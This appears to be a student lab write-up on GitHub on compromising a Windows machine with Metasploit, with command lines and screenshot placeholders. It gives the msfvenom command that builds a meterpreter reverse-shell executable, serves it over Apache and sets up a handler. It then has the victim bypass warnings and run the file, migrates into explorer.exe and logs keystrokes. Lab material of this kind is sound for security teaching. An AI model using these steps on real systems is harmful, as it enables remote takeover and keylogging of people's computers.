# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="765" height="274" alt="image" src="https://github.com/user-attachments/assets/a37fe0fb-ec3f-459e-b39f-fd8ab2a0df2b" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="604" height="144" alt="image" src="https://github.com/user-attachments/assets/d88aad7e-05c5-4d3b-8830-7c133b7189d9" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="438" height="66" alt="image" src="https://github.com/user-attachments/assets/a427d5dc-ac6a-43b7-a033-bd2a681cb983" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="378" height="52" alt="image" src="https://github.com/user-attachments/assets/64509bc9-e65f-4432-823f-aa5015ebc8ae" />

Check the status of apache2
## OUTPUT:
<img width="764" height="297" alt="image" src="https://github.com/user-attachments/assets/c1f91d9c-a209-4c58-b78a-b6621810aa43" />

Invoke msfconsole:
## OUTPUT:
<img width="716" height="760" alt="image" src="https://github.com/user-attachments/assets/6197b2ed-fd88-4a60-9aa5-0009dce61bd1" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="760" height="768" alt="image" src="https://github.com/user-attachments/assets/8face161-34d1-4c44-a2a0-8dafdea2366d" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="627" height="167" alt="image" src="https://github.com/user-attachments/assets/79ba1c40-00e3-40fd-bf93-1eeae1795d2f" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:



On kali/parrot give the command exploit
## OUTPUT:
<img width="387" height="36" alt="image" src="https://github.com/user-attachments/assets/0dbc3a4f-a9ba-468b-86ef-85ae7932007d" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="385" height="120" alt="image" src="https://github.com/user-attachments/assets/0aeed223-f4bc-4ba4-8bda-25237e7d2a1f" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="385" height="120" alt="image" src="https://github.com/user-attachments/assets/1b53208d-2ff9-4621-89db-2680d7eff65c" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="618" height="370" alt="image" src="https://github.com/user-attachments/assets/5c458fcc-c62a-44a5-96ce-2b49a0a9bf69" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="322" height="41" alt="image" src="https://github.com/user-attachments/assets/ab2a6a16-93a7-4b2e-b428-1f026cc50023" />

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="431" height="102" alt="image" src="https://github.com/user-attachments/assets/6797121f-7872-46f3-950d-29f23fc885e6" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
